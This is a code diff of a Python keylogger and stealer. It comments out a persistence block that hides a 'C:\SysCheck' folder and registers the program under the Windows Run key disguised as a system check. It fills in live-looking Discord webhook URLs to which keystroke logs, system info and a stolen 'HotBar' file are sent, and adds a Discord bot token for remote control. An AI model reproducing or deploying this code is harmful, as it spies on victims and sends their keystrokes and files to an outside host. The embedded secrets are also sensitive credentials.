@@ -10,25 +10,25 @@ elif __file__:
 	file_path = __file__
 	type_of = "py"
 
-if os.path.dirname(file_path) != "C:\\SysCheck":
-	try:
-		os.mkdir("C:\\SysCheck")
-	except:
-		pass
-	os.system("attrib +s +h /d C:\\SysCheck")
-	file_startup_path = f"C:\\SysCheck\\SysCheck.{'py' if type_of == 'py' else 'exe'}"
-	shutil.copy(file_path, file_startup_path)
-	key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, key_path, 0, win32con.KEY_ALL_ACCESS)
-	win32api.RegSetValueEx(key, "SysCheck", 0, win32con.REG_SZ, file_startup_path)
-	win32api.RegCloseKey(key)
+# if os.path.dirname(file_path) != "C:\\SysCheck":
+# 	try:
+# 		os.mkdir("C:\\SysCheck")
+# 	except:
+# 		pass
+# 	os.system("attrib +s +h /d C:\\SysCheck")
+# 	file_startup_path = f"C:\\SysCheck\\SysCheck.{'py' if type_of == 'py' else 'exe'}"
+# 	shutil.copy(file_path, file_startup_path)
+# 	key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+# 	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, key_path, 0, win32con.KEY_ALL_ACCESS)
+# 	win32api.RegSetValueEx(key, "SysCheck", 0, win32con.REG_SZ, file_startup_path)
+# 	win32api.RegCloseKey(key)
 
 keylogger = keylogger.Keylogger()
 sender = sender.Sender()
 
 keylogger.start()
-sender.webhook_log_url = ''
-sender.webhook_info_url = ''
+sender.webhook_log_url = 'https://discord.com/api/webhooks/1128326661000155248/nDG6sPvn8RitbJwHtDpm0Njy9xkOG_ajJBJfX-Hatd0RYuVymvpdD3IAgReuqj4BGam6'
+sender.webhook_info_url = 'https://discord.com/api/webhooks/1128643994163871867/B9HL54arPjlrVqR2vAuWCnICe_ngD1k8hMjCxkuIlJhxkZ-cr24gZlgZz5oYZ8sczREJ'
 sender.send_info()
 
 last_window = ''
@@ -42,7 +42,6 @@ def StealHotBar():
 		sender.send_file(hotbar, '**HotBar Stealer**')
 	except:
 		sender.send("Not Found HotBar", "HotBar Stealer")
-	print("Sent")
 StealHotBar()
 
 def Send():
@@ -69,7 +68,7 @@ def LogSend():
 			time_count = time_delay
 
 def BotControl():
-	bot.client.run('')
+	bot.client.run('MTEyODYxNzQxNTE4MjM4OTM1OA.GNy7c2.0Gl4qgQw-s5lUN7m32lRGKcIMFsTrFclewuhA4')
 
 log_send = threading.Thread(target = LogSend, daemon=True)
 bot_th = threading.Thread(target = BotControl)
